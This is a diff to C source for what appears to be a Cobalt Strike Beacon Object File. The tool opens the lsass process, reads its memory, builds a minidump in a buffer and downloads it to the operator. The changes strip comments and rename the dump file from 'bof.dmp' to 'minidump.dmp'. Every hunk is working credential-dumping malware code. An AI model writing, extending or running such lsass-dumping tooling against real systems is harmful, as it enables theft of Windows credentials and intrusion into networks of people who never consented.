@@ -200,7 +200,7 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
     LIST_ENTRY* pListEntry = ldr.InMemoryOrderModuleList.Flink;
 
     do {
-        // Read the LIST_ENTRY to get the next module
+      
         LIST_ENTRY currentEntry;
         status = NTDLL$NtReadVirtualMemory(hProcess, pListEntry, &currentEntry, sizeof(LIST_ENTRY), &bytesRead);
         if (!NT_SUCCESS(status))
@@ -210,7 +210,7 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
             return NULL;
         }
 
-        // Adjust the pointer to the containing LDR_DATA_TABLE_ENTRY
+
         LDR_DATA_TABLE_ENTRY ldrEntry;
         status = NTDLL$NtReadVirtualMemory(hProcess, (PBYTE)pListEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &ldrEntry, sizeof(ldrEntry), &bytesRead);
         if (!NT_SUCCESS(status))
@@ -238,14 +238,13 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
             return NULL;
         }
 
-        // Null-terminate the string
+       
         dllBaseName[maxReadSize / sizeof(wchar_t)] = L'\0';
 
         if (MSVCRT$_wcsicmp(dllBaseName, dllName) == 0) {
             return ldrEntry.DllBase;
         }
 
-        // Move to the next entry in the list
         pListEntry = currentEntry.Flink;
 
     } while (pListEntry != pListHead);
@@ -317,7 +316,7 @@ void go(char* arg, int len) {
     clientId.UniqueProcess = (HANDLE)pid;
     OBJECT_ATTRIBUTES objectAttributes = { 0 };
 
-    // Get handle to lsass
+  
     status = NTDLL$NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objectAttributes, &clientId);
     if (!NT_SUCCESS(status)) {
          BeaconPrintf(CALLBACK_OUTPUT, "[-] Error in NtOpenProcess\n");
@@ -474,7 +473,7 @@ void go(char* arg, int len) {
     memory64ListStream.MemoryRegionsBaseAddress = offset_mem_regions;
 
 
-    //Writes structs to byte array and then we write it to file or whatever
+
     char padding[] = {0x00, 0x00};
     size_t totalSize = sizeof(header)
     + sizeof(streamDirectoryEntry1)
@@ -494,8 +493,6 @@ void go(char* arg, int len) {
     BYTE* currentPointer = dmpFileBuffer;
 
 
-
-    //Write each structure to byde array and then move pointer as starting address for next structure.
 
     MSVCRT$memcpy(currentPointer, &header, sizeof(header));
     currentPointer += sizeof(header);
@@ -533,7 +530,7 @@ void go(char* arg, int len) {
         }
     MSVCRT$memcpy(currentPointer, memory_regions, memory_regions_size);
 
-     char dmpFile[] = "bof.dmp";
+     char dmpFile[] = "minidump.dmp";
 
     downloadFile(dmpFile, MSVCRT$strlen(dmpFile), dmpFileBuffer, totalSize);
 
